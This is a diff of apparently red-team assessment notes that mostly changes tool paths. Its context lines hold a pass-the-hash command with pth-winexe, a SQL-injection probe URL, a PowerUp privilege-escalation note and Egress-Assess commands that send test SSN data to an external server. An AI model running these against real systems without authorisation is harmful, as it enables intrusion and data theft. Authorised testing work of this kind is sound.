@@ -131,9 +131,10 @@ pth-winexe -u administrator%"hash"//"target ip" cmd.exe
 ```
 # Exploitation/Privilege Escalation
 ### PowerSploit
-The "PowerUp.ps1" script (located in "~/Tools/Powersploit/Privesc") can be used to automate the process of identifying Windows misconfigurations which are potential privilege escalation vectors. Additional research can be done to understand how to leverage the discovered misconfigurations, as methods may vary.
+The "PowerUp.ps1" script (located in "root/Tools/Powersploit/Privesc") can be used to automate the process of identifying Windows misconfigurations which are potential privilege escalation vectors. Additional research can be done to understand how to leverage the discovered misconfigurations, as methods may vary.
 [ReadTeam_CheatSheet](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)
 
+### Kerberoast 
 ### Burp Suite
 ### Metasploit
 ### SearchSploit
@@ -160,14 +161,14 @@ http://site/name.php?henryearl=-1'
 
 # Data Exfiltration
 ### Egress-Assess
-In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to ~/Tools/Egress-Assess and run: 
+In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to "root/Tools/Egress-Assess" and run: 
 ```
 Egress-Assess.py --server "protocol"
 ```
 For ftp and smtp protocols, specify a --username and --password that the client can use to connect and be sure to indicate those on the client as well. 
 
 
-Once your server is set up, use the Egress-Assess client (the internal Egress-Assess Kali machine) and navigate to the ~/Tools/Egress-Assess directory. Run the following command: 
+Once your server is set up, use the Egress-Assess client (the internal Egress-Assess Kali machine) and navigate to the "root/Tools/Egress-Assess" directory. Run the following command: 
 ```
 /Egress-Assess.py --client <protocol> --ip <server ip address> --datatype ssn –data-size 15’.
 ```
